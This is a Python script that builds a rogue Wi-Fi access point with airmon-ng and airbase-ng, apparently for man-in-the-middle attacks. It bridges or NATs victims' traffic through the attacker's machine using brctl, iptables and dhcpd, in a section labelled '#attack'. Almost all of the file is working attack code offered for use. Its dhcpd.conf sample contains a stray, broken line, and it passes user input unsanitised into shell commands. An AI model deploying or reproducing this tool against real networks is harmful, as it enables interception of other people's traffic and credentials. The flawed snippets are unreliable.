#!/usr/bin/python
#Author - Karan Tripathi (uukaran1@gmail.com)
'''
Run this script as root user.
For this script to work, you should have following
packages installed in your system and added in your PATH variable:
a) aircrack-ng suite:
        If you're running kali linux then this suite comes pre-installed.
b)dhcp server:
        If you don't have a dhcp server installed on your system, you can do so
        by issuing following commnand in terminal:

        sudo apt-get install isc-dhcp-server

        Then configure dhcpd.conf, (it can be found either at
        /etc/dhcpd.conf or /etc/dhcp/dhcpd.conf),
        by adding following to it:

        subnet 10.0.0.0 netmask 255.255.255.0 {
    	interface at0;
        range 10.0.0.100 10.0.0.120;
        option routers 10.0.0.1;
        option domain-name-servers 192.168.0.1;
                    dest='interface' ,
        }

'''

import os
import sys
import optparse
import signal

parser = optparse.OptionParser()
terminal = os.system

parser.add_option('-i' , '--interface' ,
                    dest = "interface" ,
                    help="Interface to use for creating Rogue AP")
parser.add_option('-m' , '--mode' ,
                    dest='mode' ,
                    help="Enter lan or wlan if you connected to internet via ethernet or wifi")
parser.add_option('-e' , '--essid' ,
                    dest='essid' ,
                    help="ESSID of Rogue AP")

options, remainder = parser.parse_args()


if options.interface is None:
    parser.print_help()
    parser.error("Interface Not Given")
    sys.exit(1)
elif options.mode is None:
    parser.print_help()
    parser.error("Mode Not Specified")
    sys.exit(1)
elif options.essid is None:
    parser.print_help()
    parser.error("ESSID for Rogue AP Not Given")
    sys.exit(1)

#setup

interface = options.interface
mon_start = "airmon-ng start %s" % (interface)
mode = options.mode
terminal("airmon-ng check kill")
terminal(mon_start) #monitor mode enabled
mon = interface+"mon"
mon_stop = "airmon-ng stop %s" % (mon)
rogue=options.essid
base = "gnome-terminal --command 'airbase-ng -a AA:AA:AA:AA:AA:AA -e %s %s'"%(rogue , mon)

#trap

def signal_handler(signal, frame):
        terminal(mon_stop)
        terminal("service network-manager start")
        terminal("ifconfig mitm down")
        terminal("brctl delbr mitm")
        sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

#attack

if (mode == "lan"):
    terminal(base) #rogue AP created
    terminal("sleep 2")
    terminal("ifconfig at0 0.0.0.0 up")
    terminal("brctl addbr mitm")
    terminal("brctl addif mitm eth0")
    terminal("brctl addif mitm at0")
    terminal("ifconfig mitm up")
    terminal("dhclient mitm")
    signal.pause()
elif (mode == "wlan"):
    ap  = raw_input("Enter SSID of AP for internet connection:\t ")
    paswd = raw_input("Enter Password of the AP:\t ")
    wpa_pass = "wpa_passphrase %s %s > /etc/wpa_supplicant.conf"%(ap , paswd)
    if (mon == "wlan1mon"):
        terminal("ifconfig wlan0 up")
        terminal(wpa_pass)
        terminal("wpa_supplicant -Dnl80211 -iwlan0 -c/etc/wpa_supplicant.conf &")
        terminal("clear")
        terminal(base) #rogue AP created
        terminal("echo 1 >>/proc/sys/net/ipv4/ip_forward")
        terminal("iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE")
        terminal("ifconfig at0 10.0.0.1 netmask 255.255.255.0 up")
        terminal("dhcpd start")
        signal.pause()
    elif (mon == "wlan0mon"):
        terminal("ifconfig wlan1 up")
        terminal(wpa_pass)
        terminal("gnome-terminal --command 'wpa_supplicant -Dnl80211 -iwlan1 -c/etc/wpa_supplicant.conf'")
        terminal(base) #rogue AP crated
        terminal("echo 1 >>/proc/sys/net/ipv4/ip_forward")
        terminal("iptables -t nat -A POSTROUTING -o wlan1 -j MASQUERADE")
        terminal("ifconfig at0 10.0.0.1 netmask 255.255.255.0 up")
        terminal("dhcpd start")
        signal.pause()
